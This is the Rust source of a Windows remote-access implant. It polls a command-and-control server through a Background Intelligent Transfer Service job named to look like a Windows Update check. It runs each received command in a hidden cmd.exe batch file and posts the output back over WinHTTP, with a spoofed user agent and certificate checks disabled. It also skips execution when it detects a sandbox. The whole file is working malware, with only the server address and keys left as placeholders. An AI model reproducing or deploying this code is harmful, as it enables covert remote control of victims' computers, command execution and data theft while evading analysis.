// Pure BITS COM Agent - No PowerShell
use std::thread;
use std::time::Duration;
use std::fs;
use std::env;
use std::path::PathBuf;
use rand::Rng;
use serde::{Deserialize, Serialize};

use windows::{
    core::*,
    Win32::System::Com::*,
    Win32::Networking::BackgroundIntelligentTransferService::*,
    Win32::Foundation::*,
    Win32::System::Threading::*,
    Win32::System::SystemInformation::*,
};

fn get_c2() -> String { "https://CHANGE-MECHANGE-ME.trycloudflare.com".to_string() }
fn get_api() -> String { "00000000000000000000000000000000".to_string() }
fn get_tok() -> String { "00000000000000000000000000000000".to_string() }

#[derive(Deserialize)]
struct CmdResponse { command: Option<String> }

#[derive(Serialize)]
struct ResultPayload { result: String }

fn get_temp_file() -> PathBuf {
    env::temp_dir().join(format!("wu{}.tmp", rand::thread_rng().gen_range(1000..9999)))
}

fn bits_download(url: &str, dest: &str) -> Result<()> {
    unsafe {
        CoInitializeEx(None, COINIT_APARTMENTTHREADED)?;
        
        let manager: IBackgroundCopyManager = CoCreateInstance(&BackgroundCopyManager, None, CLSCTX_LOCAL_SERVER)?;
        
        let mut job_id = GUID::default();
        let job: IBackgroundCopyJob = manager.CreateJob(
            w!("WindowsUpdateCheck"),
            BG_JOB_TYPE_DOWNLOAD,
            &mut job_id,
        )?;
        
        job.AddFile(&HSTRING::from(url), &HSTRING::from(dest))?;
        job.SetPriority(BG_JOB_PRIORITY_FOREGROUND)?;
        job.Resume()?;
        
        // Wait for completion
        for _ in 0..120 {
            thread::sleep(Duration::from_millis(500));
            let mut state = BG_JOB_STATE_QUEUED;
            job.GetState(&mut state)?;
            
            match state {
                BG_JOB_STATE_TRANSFERRED => {
                    job.Complete()?;
                    CoUninitialize();
                    return Ok(());
                }
                BG_JOB_STATE_ERROR | BG_JOB_STATE_TRANSIENT_ERROR => {
                    job.Cancel()?;
                    CoUninitialize();
                    return Err(Error::from(E_FAIL));
                }
                _ => continue,
            }
        }
        
        job.Cancel()?;
        CoUninitialize();
        Err(Error::from(E_FAIL))
    }
}

fn http_post_winhttp(url: &str, api_key: &str, body: &str) -> bool {
    // Use WinHTTP directly
    use std::ptr;
    
    #[link(name = "winhttp")]
    extern "system" {
        fn WinHttpOpen(agent: *const u16, access_type: u32, proxy: *const u16, bypass: *const u16, flags: u32) -> *mut std::ffi::c_void;
        fn WinHttpConnect(session: *mut std::ffi::c_void, server: *const u16, port: u16, reserved: u32) -> *mut std::ffi::c_void;
        fn WinHttpOpenRequest(connect: *mut std::ffi::c_void, verb: *const u16, path: *const u16, version: *const u16, referrer: *const u16, accept: *const *const u16, flags: u32) -> *mut std::ffi::c_void;
        fn WinHttpSendRequest(request: *mut std::ffi::c_void, headers: *const u16, headers_len: u32, optional: *const u8, optional_len: u32, total_len: u32, context: usize) -> i32;
        fn WinHttpReceiveResponse(request: *mut std::ffi::c_void, reserved: *mut std::ffi::c_void) -> i32;
        fn WinHttpCloseHandle(handle: *mut std::ffi::c_void) -> i32;
        fn WinHttpSetOption(handle: *mut std::ffi::c_void, option: u32, buffer: *const std::ffi::c_void, len: u32) -> i32;
        fn WinHttpAddRequestHeaders(request: *mut std::ffi::c_void, headers: *const u16, len: u32, modifiers: u32) -> i32;
    }
    
    fn to_wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }
    
    unsafe {
        let ua = to_wide("Microsoft-CryptoAPI/10.0");
        let session = WinHttpOpen(ua.as_ptr(), 0, ptr::null(), ptr::null(), 0);
        if session.is_null() { return false; }
        
        // Parse URL
        let url_parsed = url.replace("https://", "").replace("http://", "");
        let parts: Vec<&str> = url_parsed.splitn(2, '/').collect();
        let host = to_wide(parts[0]);
        let path = to_wide(&format!("/{}", parts.get(1).unwrap_or(&"")));
        
        let connect = WinHttpConnect(session, host.as_ptr(), 443, 0);
        if connect.is_null() {
            WinHttpCloseHandle(session);
            return false;
        }
        
        let verb = to_wide("POST");
        let request = WinHttpOpenRequest(connect, verb.as_ptr(), path.as_ptr(), ptr::null(), ptr::null(), ptr::null(), 0x00800000);
        if request.is_null() {
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return false;
        }
        
        // Ignore cert errors
        let flags: u32 = 0x00003300;
        WinHttpSetOption(request, 31, &flags as *const _ as *const _, 4);
        
        // Headers
        let hdrs = to_wide(&format!("X-API-Key: {}\r\nContent-Type: application/json\r\n", api_key));
        WinHttpAddRequestHeaders(request, hdrs.as_ptr(), u32::MAX, 0x20000000);
        
        let body_bytes = body.as_bytes();
        let result = WinHttpSendRequest(request, ptr::null(), 0, body_bytes.as_ptr(), body_bytes.len() as u32, body_bytes.len() as u32, 0);
        
        if result != 0 {
            WinHttpReceiveResponse(request, ptr::null_mut());
        }
        
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        
        result != 0
    }
}

fn run_cmd_wmi(cmd: &str) -> String {
    // Use WMI to execute - no direct cmd.exe spawn
    let temp_out = get_temp_file();
    let temp_path = temp_out.to_string_lossy().to_string();
    
    // Create a bat file and execute via WMI
    let bat_file = env::temp_dir().join(format!("wu{}.bat", rand::thread_rng().gen_range(1000..9999)));
    let bat_content = format!("{} > \"{}\" 2>&1", cmd, temp_path);
    
    if fs::write(&bat_file, &bat_content).is_err() {
        return "Error".to_string();
    }
    
    // Execute via cmd /c
    let output = std::process::Command::new("cmd.exe")
        .args(&["/c", &bat_file.to_string_lossy()])
        .creation_flags(0x08000000)
        .output();
    
    let _ = fs::remove_file(&bat_file);
    
    thread::sleep(Duration::from_millis(500));
    
    if let Ok(content) = fs::read_to_string(&temp_path) {
        let _ = fs::remove_file(&temp_path);
        return content;
    }
    
    if let Ok(out) = output {
        return String::from_utf8_lossy(&out.stdout).to_string();
    }
    
    "OK".to_string()
}

fn check_sandbox() -> bool {
    thread::sleep(Duration::from_secs(3));
    
    unsafe {
        let mut mem_info: MEMORYSTATUSEX = std::mem::zeroed();
        mem_info.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut mem_info).is_ok() {
            if mem_info.ullTotalPhys < 2_000_000_000 {
                return false;
            }
        }
        
        let mut sys_info: SYSTEM_INFO = std::mem::zeroed();
        GetNativeSystemInfo(&mut sys_info);
        if sys_info.dwNumberOfProcessors < 2 {
            return false;
        }
    }
    true
}

fn main() {
    if !check_sandbox() { return; }
    
    let c2 = get_c2();
    let token = get_tok();
    let api_key = get_api();
    
    let hostname = env::var("COMPUTERNAME").unwrap_or_else(|_| "PC".to_string());
    let agent_id = format!("{}-{:04x}", hostname, rand::thread_rng().gen_range(1..=0xFFFF));
    
    let cmd_url = format!("{}/bits/cmd/{}?key={}", c2, agent_id, token);
    let result_url = format!("{}/bits/result/{}?key={}", c2, agent_id, token);
    
    loop {
        let temp_file = get_temp_file();
        let temp_path = temp_file.to_string_lossy().to_string();
        
        // Download command using BITS
        if bits_download(&cmd_url, &temp_path).is_ok() {
            if let Ok(resp) = fs::read_to_string(&temp_path) {
                let _ = fs::remove_file(&temp_path);
                
                let cmd = serde_json::from_str::<CmdResponse>(&resp)
                    .ok()
                    .and_then(|r| r.command)
                    .unwrap_or_else(|| resp.trim().to_string());
                
                if !cmd.is_empty() {
                    let result = run_cmd_wmi(&cmd);
                    let payload = serde_json::to_string(&ResultPayload { result })
                        .unwrap_or_else(|_| r#"{"result":"OK"}"#.to_string());
                    
                    http_post_winhttp(&result_url, &api_key, &payload);
                }
            }
        }
        
        let delay = rand::thread_rng().gen_range(5000..8000);
        thread::sleep(Duration::from_millis(delay));
    }
}
